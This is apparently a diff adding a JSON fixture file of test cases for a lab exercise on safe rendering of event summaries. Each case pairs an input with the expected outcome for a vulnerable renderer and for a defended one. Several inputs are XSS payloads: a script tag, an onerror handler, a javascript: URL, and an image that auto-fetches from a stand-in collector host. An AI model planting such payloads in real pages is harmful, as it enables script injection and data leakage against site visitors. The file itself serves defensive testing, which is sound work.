@@ -1,0 +1,100 @@
+[
+  {
+    "id": "clean",
+    "candidate": {
+      "title": "Harbor Byte Community Night",
+      "summary": "活動於 2026-09-01 19:30 在 North Pier Lab 舉行，主題是安全渲染。",
+      "public_code": "DAY14VISUAL8K3M",
+      "completion_marker": "DAY14_TARGET_COMPLETED"
+    },
+    "expected": {
+      "vulnerable_active_html": false,
+      "defended_decision": "allow",
+      "defended_active_html": false
+    }
+  },
+  {
+    "id": "benign-angle-brackets",
+    "candidate": {
+      "title": "Harbor Byte Community Night",
+      "summary": "入場條件為 5 < 8，而且 12 > 3；這些符號必須原樣顯示。",
+      "public_code": "DAY14VISUAL8K3M",
+      "completion_marker": "DAY14_TARGET_COMPLETED"
+    },
+    "expected": {
+      "vulnerable_active_html": false,
+      "defended_decision": "allow",
+      "defended_active_html": false
+    }
+  },
+  {
+    "id": "script-element",
+    "candidate": {
+      "title": "Harbor Byte Community Night",
+      "summary": "<script>document.body.dataset.compromised='yes'</script>",
+      "public_code": "DAY14VISUAL8K3M",
+      "completion_marker": "DAY14_TARGET_COMPLETED"
+    },
+    "expected": {
+      "vulnerable_active_html": true,
+      "defended_decision": "allow",
+      "defended_active_html": false
+    }
+  },
+  {
+    "id": "event-handler",
+    "candidate": {
+      "title": "Harbor Byte Community Night",
+      "summary": "<img src=x onerror=alert(1)>",
+      "public_code": "DAY14VISUAL8K3M",
+      "completion_marker": "DAY14_TARGET_COMPLETED"
+    },
+    "expected": {
+      "vulnerable_active_html": true,
+      "defended_decision": "allow",
+      "defended_active_html": false
+    }
+  },
+  {
+    "id": "javascript-url",
+    "candidate": {
+      "title": "Harbor Byte Community Night",
+      "summary": "<a href=javascript:alert(1)>活動資訊</a>",
+      "public_code": "DAY14VISUAL8K3M",
+      "completion_marker": "DAY14_TARGET_COMPLETED"
+    },
+    "expected": {
+      "vulnerable_active_html": true,
+      "defended_decision": "block",
+      "defended_active_html": false
+    }
+  },
+  {
+    "id": "auto-fetch-url",
+    "candidate": {
+      "title": "Harbor Byte Community Night",
+      "summary": "<img src=https://collector.invalid/pixel?d=public-demo>",
+      "public_code": "DAY14VISUAL8K3M",
+      "completion_marker": "DAY14_TARGET_COMPLETED"
+    },
+    "expected": {
+      "vulnerable_active_html": true,
+      "defended_decision": "block",
+      "defended_active_html": false
+    }
+  },
+  {
+    "id": "canary-only",
+    "candidate": {
+      "title": "Harbor Byte Community Night",
+      "summary": "LAB_ONLY_DAY14_CANARY_8Q2M_20260809",
+      "public_code": "DAY14VISUAL8K3M",
+      "completion_marker": "DAY14_TARGET_COMPLETED"
+    },
+    "expected": {
+      "vulnerable_active_html": false,
+      "defended_decision": "block",
+      "defended_active_html": false
+    }
+  }
+]
